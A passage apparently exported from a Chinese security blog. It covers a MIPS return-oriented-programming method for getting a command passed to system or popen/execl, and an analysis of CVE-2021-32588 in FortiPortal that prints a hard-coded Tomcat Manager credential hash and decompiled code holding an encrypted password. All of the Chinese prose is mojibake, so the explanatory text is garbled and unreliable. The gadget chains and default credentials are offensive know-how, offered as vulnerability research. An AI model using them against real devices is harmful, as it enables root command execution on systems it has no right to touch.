<p>æ‰§è¡Œæ—¶ï¼Œ$sp + 24 åœ°å€è¢«åŠ è½½åˆ° $a0ï¼Œ$sp + 68 åœ°å€çš„å€¼è¢«åŠ è½½åˆ° $raï¼Œç„¶åä»¥ 4 å­—èŠ‚ä¸ºå•ä½å°† $sp + 64 ~ $sp + 52 çš„æ•°æ®åŠ è½½åˆ° $s3 ~ $s0ï¼Œæœ€åç”¨ jr æŒ‡ä»¤è·³è½¬åˆ° $ra å³ $sp + 68 æŒ‡å‘çš„å†…å­˜åŒºåŸŸï¼Œç”±äº MIPS çš„æµæ°´çº¿æ•ˆåº”ï¼Œæœ€åä¸€å¥ addiu $sp,72 åœ¨è·³è½¬ä¹‹åå·²ç»æ‰§è¡Œå®Œæ¯•ã€‚</p>
<p>æ­¤æ—¶å‡ ä¸ªå¯„å­˜å™¨çŠ¶æ€ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a0 = command</span><br><span class="line">$ra = system_address</span><br><span class="line">$s0 = &quot;aaaa&quot;</span><br><span class="line">$s1 = &quot;aaaa&quot;</span><br><span class="line">$s2 = &quot;aaaa&quot;</span><br><span class="line">$s3 = &quot;aaaa&quot;</span><br><span class="line">$pc = system_address</span><br><span class="line">$sp = old_sp + 72</span><br></pre></td></tr></table></figure></div>

<p>ç”±äºæœ€åçš„ addiu $sp, 72ï¼Œ$sp æŒ‡å‘æˆ‘ä»¬å¸ƒå±€çš„å†…å­˜æ•°æ®ä¹‹ä¸‹(å³ data éƒ¨åˆ†)ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/mipsrop-2.png"
                     
                ></p>
<p>$pc å·²ç»æŒ‡å‘ system å‡½æ•°ï¼Œç¨‹åºç»§ç»­æ‰§è¡Œ system å¯¹åº”ä»£ç ï¼ŒæŸ¥çœ‹ system å‡½æ•°å¼€å¤´çš„éƒ¨åˆ†æ±‡ç¼–ä»£ç </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">la      $gp, locret_1E4F0  # Alternative name is &#x27;__libc_system&#x27;</span><br><span class="line">addu    $gp, $t9</span><br><span class="line">addiu   $sp, -40</span><br><span class="line">sw      $s0, 24($sp)</span><br><span class="line">la      $s0, loc_50000</span><br><span class="line">sw      $gp, 16($sp)</span><br><span class="line">sw      $s1, 28($sp)</span><br><span class="line">sw      $ra, 36($sp)</span><br><span class="line">sw      $s2, 32($sp)</span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­ç¬¬ä¸‰æ¡æŒ‡ä»¤ä¸º system å‡½æ•°åˆ†é…æ ˆç©ºé—´ï¼ŒæŠŠ $sp å‡å» 40ï¼Œå¾—åˆ° system å‡½æ•°çš„æ ˆé¡¶ï¼Œåç»­ system ä»¥åŠ system æ‰€è°ƒç”¨çš„å­å‡½æ•°ï¼Œéƒ½ä¼šä½¿ç”¨è¿™ä¸ªæ ˆé¡¶åŠä»¥ä¸Šçš„å†…å­˜æ¥å­˜å–ä¸´æ—¶å˜é‡ï¼Œå¦‚å›¾</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/mipsrop-3.png"
                     
                ></p>
<p>å®é™…ä¸Šå°äº $sp + 72 çš„æ ˆç©ºé—´éƒ½å¯èƒ½ä¼šè¢«å…¶å®ƒå˜é‡çš„æ•°æ®æ‰€è¦†ç›–ã€‚</p>
<p>å¦‚æœæ°å·§æœ‰æŸä¸ªä¸´æ—¶å˜é‡çš„æ•°æ®è¢«ä¿å­˜åˆ° $sp + 24 é™„è¿‘çš„å†…å­˜ï¼Œæœ¬åº”æ˜¯æ­£å¸¸çš„ç³»ç»Ÿå‘½ä»¤å°±ä¼šè¢«ç ´åï¼Œå¯¼è‡´ exploit å¤±è´¥ã€‚</p>
<h2 id="å¦‚ä½•é¿å…æ­¤ç±»é—®é¢˜"><a href="#å¦‚ä½•é¿å…æ­¤ç±»é—®é¢˜" class="headerlink" title="å¦‚ä½•é¿å…æ­¤ç±»é—®é¢˜"></a>å¦‚ä½•é¿å…æ­¤ç±»é—®é¢˜</h2><p><strong>æ–¹æ³•1ï¼šå¯»æ‰¾åŒ…å« jr $sx çš„ gadget æˆ–åˆ©ç”¨å…¶å®ƒå¯„å­˜å™¨è½¬ç§»å‚æ•°</strong></p>
<p>mipsrop ä¸­å¯èƒ½ä¼šæ‰¾åˆ°å¦‚ä¸‹ gadget</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">|  0x00016BC8  |  addiu $s0,$sp,16 ; jalr  $s1  </span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ª gadget å¯¹åº”çš„æŒ‡ä»¤åºåˆ—å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">addiu   $s0, $sp, 16</span><br><span class="line">move    $a0, $s0</span><br><span class="line">move    $t9, $s1</span><br><span class="line">jalr    $t9</span><br><span class="line">move    $a1, $s5</span><br></pre></td></tr></table></figure></div>

<p>å…ˆå°† $sp + 16 åœ°å€åŠ è½½åˆ° $s0ï¼Œç„¶å $s0 è¢«èµ‹å€¼ç»™ $a0ï¼Œæœ€åè·³è½¬åˆ° $s1ï¼ŒæœŸé—´ä¸å­˜åœ¨å¯¹ $sp çš„ä¿®æ”¹ã€‚è¿™ç§ gadget å¾ˆå¤šæƒ…å†µä¸‹å¯ä»¥é˜²æ­¢ command è¢«è¦†ç›–ã€‚</p>
<p><strong>æ–¹æ³•2ï¼šåˆ©ç”¨ popen éƒ¨åˆ†ä»£ç </strong></p>
<p>popen ä¸­è°ƒç”¨äº† execl å‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå…¶ä¸­å‚æ•°åŠ è½½è¿‡ç¨‹é€šå¸¸ä½äºåŒä¸€ä¸ªæ±‡ç¼–ä»£ç å—ä¸­</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">la      $a0, loc_50000</span><br><span class="line">la      $a1, loc_50000</span><br><span class="line">la      $a2, loc_50000</span><br><span class="line">la      $t9, execl</span><br><span class="line">addiu   $a0, (aBinSh - 0x50000)  # &quot;/bin/sh&quot;</span><br><span class="line">sw      $zero, 0x50+var_40($sp)</span><br><span class="line">addiu   $a1, (off_533C4 - 0x50000)</span><br><span class="line">addiu   $a2, (off_532C0 - 0x50000)</span><br><span class="line">bal     execl</span><br><span class="line">move    $a3, $s7</span><br></pre></td></tr></table></figure></div>

<p>$a0ã€$a1ã€$a2 åœ¨ä»£ç ä¸­éƒ½å·²å®ŒæˆåŠ è½½ï¼Œæˆ‘ä»¬åªéœ€è¦æ§åˆ¶ $s7 ä¸º command åœ°å€ï¼Œè¿™æ ·åœ¨è·³è½¬åˆ° execl æ‰§è¡Œå‰ï¼Œmove $a3,$s7 å°±ä¼šæŠŠ command åœ°å€æ”¾åˆ° $a3 ä¸­ï¼Œå®Œæˆå‚æ•°ä¼ é€’ã€‚</p>
<p>é€šè¿‡ mipsrop æ‰¾åˆ°å°† stack åœ°å€åŠ è½½åˆ° $s7 çš„ gadget</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">addiu   $s7, $sp, 24</span><br><span class="line">addiu   $s6, 0x101</span><br><span class="line">addiu   $s5, (asc_54958 - 0x50000)</span><br><span class="line">lw      $a0,  -22144($fp)</span><br><span class="line">move    $a1, $s7</span><br><span class="line">move    $a2, $s6</span><br><span class="line">move    $t9, $s4</span><br><span class="line">jalr    $t9</span><br><span class="line">move    $a3, $s5</span><br></pre></td></tr></table></figure></div>

<p>åŠ è½½åè·³è½¬åˆ° $s4 ç»§ç»­æ‰§è¡Œï¼Œä½†å¦‚æœç›´æ¥è·³å› popenï¼Œä¼šå¯¼è‡´å‚æ•°å¼‚å¸¸ï¼Œè¿™æ˜¯å› ä¸º MIPS ä¸­å¯¹å…¨å±€å˜é‡å¯»å€æœ‰ç‰¹æ®Šçš„ç­–ç•¥ï¼ŒMIPS ä¸ºäº†æ–¹ä¾¿å¯¹å…¨å±€å˜é‡æ•°æ®çš„å¯»å€ï¼Œå¼•å…¥ä¸€ä¸ªå«åš $gp çš„å¯„å­˜å™¨ï¼Œé€šè¿‡æ­¤å¯„å­˜å™¨ï¼Œä¸€æ¡ 4 å­—èŠ‚çš„æŒ‡ä»¤å³å¯å®ç°åœ¨ $gp +- 32K å†…å­˜ä¸­çš„å¯»å€è¿‡ç¨‹[3]ã€‚</p>
<p>$gp æ˜¯åœ¨å‡½æ•°å¼€å¤´å°±è®¾ç½®å¥½çš„ï¼Œç”±äºæˆ‘ä»¬æ˜¯ç›´æ¥è·³è½¬åˆ° popen å‡½æ•°çš„ä¸­é—´éƒ¨åˆ†ï¼Œè¿™å°±å¯¼è‡´ $gp é”™è¯¯ï¼Œæ— æ³•æ­£ç¡®æ‰¾åˆ°ç›¸å…³å‚æ•°ï¼Œæ‰€ä»¥éœ€è¦å¼•å…¥å¦ä¸€æ®µ gadget æ¥ä¿®æ­£ $gpã€‚</p>
<p>$gp å¯„å­˜å™¨å…·ä½“çš„å€¼å¯é€šè¿‡è°ƒè¯•ç›®æ ‡å‡½æ•°å¼€å¤´ç¡®å®šï¼Œè¿™ä¸ªå€¼ç›¸å¯¹ libc åŸºå€åç§»å›ºå®šã€‚ç¡®å®šå¥½ $gp å€¼åå³å¯å¯»æ‰¾ç›¸å…³ gadget ä¿®æ­£ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lw      $gp, 16($sp)</span><br><span class="line">move    $t9, $s1</span><br><span class="line">jalr    $t9</span><br><span class="line">li      $a0, 3</span><br></pre></td></tr></table></figure></div>

<p>ä»¥ä¸Š gadget ä¼šå°† $sp + 16 çš„å€¼åŠ è½½åˆ° $gpï¼Œç„¶åè·³è½¬åˆ° $s1ï¼Œæ°å¥½å¯ä»¥æ»¡è¶³éœ€æ±‚ã€‚</p>
<p>ç»¼åˆä¸Šè¿°æµç¨‹ï¼Œgadget æ‰§è¡Œé¡ºåºå¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">å°† $sp + 24 å¡«å……ä¸º commandï¼Œè·³è½¬åˆ°ç¬¬ä¸€æ®µ gadget ($ra)</span><br><span class="line">gadget1: å°† command åœ°å€åŠ è½½åˆ° $s7ï¼Œè·³è½¬åˆ°ç¬¬äºŒæ®µ gadget ($s4)</span><br><span class="line">gadget2: å°† $sp + 16 åŠ è½½åˆ° $gpï¼Œè·³è½¬åˆ°ç¬¬ä¸‰æ®µ gadget ($s1)</span><br><span class="line">gadget3: popen éƒ¨åˆ†ä»£ç </span><br></pre></td></tr></table></figure></div>

<p>è¿™æ ·æ‰§è¡Œ popen éƒ¨åˆ†æ—¶ï¼Œå„å‚æ•°å¯æ­£ç¡®å¯»å€ï¼Œå¹¶ä¸” command ä¹Ÿä¸ä¼šè¢«è¦†ç›–ï¼Œå¯ä»¥æˆåŠŸæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p>
<p>å®é™…ä¸Šï¼Œé™¤äº† MIPS å¤–å…¶ä»–æ¶æ„ä¹Ÿå¯èƒ½å­˜åœ¨ç±»ä¼¼é—®é¢˜ï¼Œä¸»è¦åŸå› å°±æ˜¯éœ€è¦ä½¿ç”¨çš„æ•°æ®ä½äºä¸‹ä¸€ä¸ªå‡½æ•°çš„æ ˆå¸§å†…ï¼Œæ¯”è¾ƒé€šç”¨çš„æ€è·¯ï¼Œä¸€æ˜¯å¯ä»¥è°ƒæ•´æ•°æ®ä½ç½®ï¼Œå°†å…¶ç§»åŠ¨åˆ°ä¸ä¼šè¢«è¦†ç›–æˆ–ä¿®æ”¹çš„ä½ç½®ï¼Œæˆ–è€…å¯ä»¥åˆ©ç”¨å¯¹åº”æŒ‡ä»¤é›†çš„ç‰¹æ€§æ¥é¿å…æ•°æ®è¢«è¦†ç›–ã€‚</p>
<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p>[1] <a class="link"   href="https://stackoverflow.com/questions/8178001/mips-memory-execution-prevention?rq=1" >operating system - MIPS memory execution prevention - Stack Overflow<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>[2] <a class="link"   href="https://s3-eu-west-1.amazonaws.com/downloads-mips/documents/MD00090-2B-MIPS32PRA-AFP-06.02.pdf" >MIPSÂ® Architecture For Programmers <i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>[3] <a class="link"   href="https://stackoverflow.com/questions/2618790/mips-gp-register" >MIPS $gp register - Stack Overflow<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2021-32588</title>
    <url>/2021/09/02/CVE-2021-32588/</url>
    <content><![CDATA[<p>æŠ«éœ²ä¿¡æ¯ï¼š<a class="link"   href="https://www.fortiguard.com/psirt/FG-IR-21-077" >https://www.fortiguard.com/psirt/FG-IR-21-077<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>æ¼æ´ç¼–å·ï¼šCVE-2021-32588</p>
<p>æ¼æ´æè¿°ï¼šA use of hard-coded credentials (CWE-798) vulnerability in FortiPortal may allow a remote and unauthenticated attacker to execute unauthorized commands as root by uploading and deploying malicious web application archive files using the default hard-coded Tomcat Manager username and password. </p>
<span id="more"></span>

<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>ä¸‹è½½ 6.0.4 å’Œ 6.0.5 ä¸¤ä¸ªç‰ˆæœ¬ï¼Œå¯¼å…¥ 6.0.4 é•œåƒåˆ° VMwareï¼Œå¯åŠ¨åå‘ç°æ§åˆ¶å°è¾“å‡ºé”™è¯¯ä¿¡æ¯</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">The last packet sent successfully to the server was 0 milliseconds ago. The driver has not received any packets from the server..</span><br><span class="line">db_Migration failed. Going to prevent fpc web app from launching.</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œæç¤ºé“¾æ¥æ•°æ®åº“æœåŠ¡å™¨å¤±è´¥ï¼ŒæŸ¥é˜…å®˜ç½‘æ‰‹å†Œå‘ç°éœ€è¦æ‰‹åŠ¨é…ç½®ä¸€å°æ•°æ®åº“æœåŠ¡å™¨ï¼Œå…·ä½“æ­¥éª¤å¯å‚è€ƒ[å®˜ç½‘æ–‡æ¡£](<a class="link"   href="https://docs.fortinet.com/document/fortiportal/6.0.5/administration-guide/878514/basic-setup" >Administration Guide | FortiPortal 6.0.5 | Fortinet Documentation Library<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)ã€‚</p>
<p>é…ç½®å¥½æ•°æ®åº“æœåŠ¡å™¨åï¼Œéœ€è¦å¯¹è™šæ‹Ÿæœºçš„ç½‘ç»œç­‰è¿›è¡Œé…ç½®ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin ç©ºå¯†ç ç™»å½•ç³»ç»Ÿ</span><br><span class="line">config system interface   è¿›å…¥ç½‘å¡é…ç½®é€‰é¡¹</span><br><span class="line">edit port1    ç¼–è¾‘ port1 ç½‘å¡</span><br><span class="line">set ip 192.168.0.200/24   è®¾ç½®ç½‘å¡ ip ä¸º 192.168.0.200ï¼Œæ©ç  255.255.255.0</span><br><span class="line">set allowaccess ping https ssh http   è®¾ç½®ç½‘å¡å…è®¸ sshã€httpã€ping https åè®®</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">config system route    è¿›å…¥è·¯ç”±é…ç½®é€‰é¡¹</span><br><span class="line">edit 1                 ç¼–è¾‘æ¡ç›® 1</span><br><span class="line">set device port1       è®¾ç½®ç½‘å¡ port1</span><br><span class="line">set gateway 192.168.0.1  è®¾ç½®ç½‘å…³åœ°å€ 192.168.0.1</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">config system sql    è¿›å…¥æ•°æ®åº“é…ç½®é€‰é¡¹</span><br><span class="line">set status remote    è®¾ç½®æ•°æ®åº“æœåŠ¡ä¸ºè¿œç¨‹</span><br><span class="line">set database-name fp_fazlite     è®¾ç½®æ•°æ®åº“å</span><br><span class="line">set database-type mysql     è®¾ç½®æ•°æ®åº“ç±»å‹</span><br><span class="line">set database-port 3306      è®¾ç½®æ•°æ®åº“æœåŠ¡å™¨ç«¯å£</span><br><span class="line">set username fpc             è®¾ç½® mysql ç”¨æˆ·å</span><br><span class="line">set password xyz             mysql å¯†ç </span><br><span class="line">set server 192.168.0.163    è®¾ç½®æ•°æ®åº“æœåŠ¡å™¨åœ°å€</span><br><span class="line">end</span><br></pre></td></tr></table></figure></div>

<p>é…ç½®å¥½åé‡å¯è™šæ‹Ÿæœºã€‚</p>
<p>åœ¨æ•°æ®åº“æœåŠ¡å™¨ç™»å½• mysqlï¼Œæ‰§è¡Œä»¥ä¸‹è¯­å¥æ¥æŸ¥çœ‹æ˜¯å¦é…ç½®æˆåŠŸ</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from ftntpmcdb.fpc_version;</span><br></pre></td></tr></table></figure></div>

<p>ç»“æœä¸­è¾“å‡ºäº†ç‰ˆæœ¬ä¿¡æ¯å³å¯ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2021-32588-1.png"
                     
                ></p>
<p>æ­¤æ—¶å¯é€šè¿‡åˆšåˆšé…ç½®çš„ IP æ¥è®¿é—® web æœåŠ¡ã€‚</p>
<h3 id="å›ºä»¶è·å–"><a href="#å›ºä»¶è·å–" class="headerlink" title="å›ºä»¶è·å–"></a>å›ºä»¶è·å–</h3><p>fortiportal æœ¬èº«ä¸æä¾› Linux shellï¼Œæˆ‘ä»¬éœ€è¦æƒ³åŠæ³•æ‹¿åˆ°è®¾å¤‡å›ºä»¶ã€‚é¦–å…ˆæ‰¾åˆ°å¯¼å…¥çš„è™šæ‹Ÿç£ç›˜ï¼Œå¯¹å…¶è¿›è¡Œè§£å‹ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">PSï¼šå¦‚æœæ˜¯åœ¨ Windows ç¯å¢ƒä¸‹ï¼Œå»ºè®®å®‰è£… 7-zip è½¯ä»¶ï¼Œå®‰è£…åç›´æ¥å³é”®è™šæ‹Ÿç£ç›˜ï¼Œé€‰æ‹©ä½¿ç”¨ 7-zip æ‰“å¼€å³å¯çœ‹åˆ°å†…å®¹ã€‚</span><br></pre></td></tr></table></figure></div>

<p>è§£å‹å¯å¾—åˆ°ä¸€ä¸ª rootfs.gz æ–‡ä»¶ï¼Œè§£åŒ…åè·å–åˆ°æ ¹æ–‡ä»¶ç³»ç»Ÿï¼Œä½†æ˜¯æ­¤æ—¶æ–‡ä»¶ç³»ç»Ÿä¸­ç¼ºå¤±äº†å¤§éƒ¨åˆ†æ•°æ®ï¼Œåœ¨æ ¹ç›®å½•ä¸‹èƒ½æ‰¾åˆ°ä¸‰ä¸ªå‹ç¼©åŒ…: bin.tar.xzã€lib.tar.xzã€usr.tar.xz</p>
<p>ç›´æ¥ä½¿ç”¨ tar ç­‰å·¥å…·ä¸èƒ½è§£å‹è¿™ä¸‰ä¸ªæ–‡ä»¶ï¼ŒçŒœæµ‹è®¾å¤‡åœ¨åˆå§‹åŒ–è¿‡ç¨‹ä¸­ä¼šè¿›ä¸€æ­¥å¯¹è¿™äº›æ–‡ä»¶è¿›è¡Œå¤„ç†ã€‚</p>
<p>è€ƒè™‘åˆ° Linux ç³»ç»Ÿçš„å¯åŠ¨æµç¨‹ï¼Œå†…æ ¸åˆå§‹åŒ–å®Œæˆä¹‹åä¼šè¿›å…¥ init_post å‡½æ•°ï¼Œåœ¨è¿™é‡Œå°†æ§åˆ¶æµç§»äº¤ç»™ç”¨æˆ·ç©ºé—´è¿›ç¨‹ï¼ŒåŒ…æ‹¬ &#x2F;sbin&#x2F;initã€&#x2F;etc&#x2F;initã€&#x2F;bin&#x2F;initã€&#x2F;bin&#x2F;shã€‚</p>
<p>æ­¤æ—¶å¯ä»¥å‚è€ƒ<a href="https://wzt.ac.cn/2021/05/12/vm_shell">æ–‡ç« </a>ï¼Œé€šè¿‡è™šæ‹Ÿæœºè°ƒè¯•çš„æ–¹æ³•å°è¯•è·å– shellï¼Œä½†è¿™é‡Œæˆ‘ä»¬æœ‰æ›´ç®€å•çš„æ–¹æ³•ã€‚</p>
<p>åœ¨è§£å‹å‡ºæ¥çš„æ ¹æ–‡ä»¶ç³»ç»Ÿä¸­å¯»æ‰¾ä¸Šè¿°çš„å››ä¸ªåˆå§‹åŒ–ç¨‹åºï¼Œåœ¨ &#x2F;bin ç›®å½•ä¸‹å‘ç°åªæœ‰ä¸€ä¸ª init æ–‡ä»¶ã€‚</p>
<p>IDA æ‰“å¼€åˆ†æï¼Œå…¶ä¸»å‡½æ•°ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_804A4A2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> v1; <span class="comment">// [esp-4h] [ebp-24h]</span></span><br><span class="line">    <span class="type">char</span> v2; <span class="comment">// [esp-4h] [ebp-24h]</span></span><br><span class="line">    <span class="type">char</span> v3; <span class="comment">// [esp-4h] [ebp-24h]</span></span><br><span class="line">    <span class="type">char</span> v4; <span class="comment">// [esp-4h] [ebp-24h]</span></span><br><span class="line">    <span class="type">int</span> v5[<span class="number">2</span>]; <span class="comment">// [esp+14h] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( init_loader_decompress_dir(<span class="string">&quot;lib&quot;</span>, <span class="number">0</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( init_loader_decompress_dir(<span class="string">&quot;bin&quot;</span>, <span class="number">0</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( init_loader_decompress_dir(<span class="string">&quot;usr&quot;</span>, <span class="number">0</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ( init_loader_decompress_dir(<span class="string">&quot;etc/dm/syntax/syntax&quot;</span>, <span class="number">1</span>) &lt; <span class="number">0</span> )</span><br><span class="line">                    sub_804A316(<span class="string">&quot;Decompress syntax error, image error\n&quot;</span>, v4);</span><br><span class="line">                v5[<span class="number">0</span>] = <span class="string">&quot;/bin/init&quot;</span>;</span><br><span class="line">                v5[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">                sub_807EB00(<span class="string">&quot;/bin/init&quot;</span>, v5, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                sub_804A316(<span class="string">&quot;Decompress usr error, image error\n&quot;</span>, v3);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            sub_804A316(<span class="string">&quot;Decompress bin error, image error\n&quot;</span>, v2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sub_804A316(<span class="string">&quot;Decompress lib error, image error\n&quot;</span>, v1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ®µä»£ç çœ‹èµ·æ¥æ˜¯å¯¹æ ¹ç›®å½•ä¸‹çš„ä¸‰ä¸ªå‹ç¼©åŒ…å®ç°è§£å‹ï¼Œç”±äºè¯¥ç¨‹åºä¸º x86 æ¶æ„ï¼Œå¯ä»¥ç›´æ¥åœ¨è™šæ‹Ÿæœºä¸­è¿è¡Œï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤å®ç°å¯¹æ ¹ç›®å½•çš„å®Œå…¨è§£å‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chroot . ./bin/init</span><br></pre></td></tr></table></figure></div>

<p>æ‰§è¡Œåç­‰å¾…ç¨‹åºè¿è¡Œå®Œæ¯•ï¼Œå³å¯çœ‹åˆ°é‡Šæ”¾å‡ºäº†å®Œæ•´çš„ &#x2F;binã€&#x2F;lib å’Œ &#x2F;usr ç›®å½•ã€‚</p>
<p>åœ¨ &#x2F;usr&#x2F;local&#x2F;tomcat ç›®å½•å‘ç°å…³é”®æ–‡ä»¶ã€‚</p>
<h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>è§£åŒ… 6.0.4 å’Œ 6.0.5 ä¸¤ä¸ªç‰ˆæœ¬çš„å›ºä»¶ï¼Œè¿›è¡Œè¡¥ä¸å¯¹æ¯”ï¼Œå‘ç°æ–°ç‰ˆä¸­ç§»é™¤äº† webapps ä¸‹çš„ manager ç›®å½•ï¼Œç»è°ƒæŸ¥ï¼Œæ­¤ç›®å½•å°±æ˜¯æ¼æ´æŠ«éœ²ä¿¡æ¯ä¸­æåˆ°çš„ Tomcat Manager ç»„ä»¶ã€‚</p>
<p>Tomcat Manager ä¼šå» conf&#x2F;tomcat-users.xml æ–‡ä»¶ä¸­è¯»å–ç”¨æˆ·ä¿¡æ¯ï¼ŒæŸ¥çœ‹æ­¤æ–‡ä»¶å‘ç°ä»¥ä¸‹è®°å½•</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">&quot;manager-script&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span> <span class="attr">username</span>=<span class="string">&quot;fpcadmin&quot;</span> <span class="attr">password</span>=<span class="string">&quot;046ed5f485431c63$1000$63da3a538f1f15aea922875fd1e2c5645629ff3d24997bb3f978ad2538921168&quot;</span> <span class="attr">roles</span>=<span class="string">&quot;manager-script&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è¯´æ˜åœ¨é»˜è®¤é…ç½®ä¸‹å­˜åœ¨ä¸€ä¸ªåä¸º fpcadmin çš„ manager-script ç”¨æˆ·ï¼Œæ­¤ç”¨æˆ·æ— æ³•è®¿é—® GUI ç•Œé¢ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ç›´æ¥è°ƒç”¨æ¥å£å®ç°è¯¸å¤šåŠŸèƒ½ã€‚</p>
<p>é¦–å…ˆè¦è§£å†³å¯†ç çš„é—®é¢˜ï¼ŒTomcat Manager å®˜æ–¹æ–‡æ¡£ä¸­æåˆ°ä¸ºäº†å®‰å…¨æ€§ï¼Œtomcat-users.xml ä¸­çš„ç”¨æˆ·å¯†ç å…è®¸è¿›è¡ŒåŠ å¯†ï¼Œé˜²æ­¢å¯†ç æ³„éœ²ã€‚é€šè¿‡å…¨å±€æœç´¢ï¼Œåœ¨åä¸º FpcReloadTomcatApp.class ç±»ä¸­æ‰¾åˆ°å¯¹ fpcadmin ç”¨æˆ·æ“ä½œçš„ä»£ç ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">reloadTomcatApp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">StringBuffer</span> <span class="variable">curlForReload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">    curlForReload</span><br><span class="line">        .append(<span class="string">&quot;curl -k -u fpcadmin:&quot;</span>)</span><br><span class="line">        .append(CipherUtils.decryptString(<span class="string">&quot;y542PfTSFP9E2mZ6SfBaIK4Y8OIEV3HyiBDBUjSQXB4=&quot;</span>))</span><br><span class="line">        .append(<span class="string">&quot; https://localhost/manager/text/reload?path=/fpc&quot;</span>);</span><br><span class="line">    log.info(<span class="string">&quot;execute curl for tomacat reload start &quot;</span> + Thread.currentThread().getName());</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> executeRequest(curlForReload.toString());</span><br><span class="line">        log.info(<span class="string">&quot;Tomcat reload context &#x27;fpc&#x27; result: &quot;</span> + output);</span><br><span class="line">        <span class="keyword">return</span> (output != <span class="literal">null</span>) 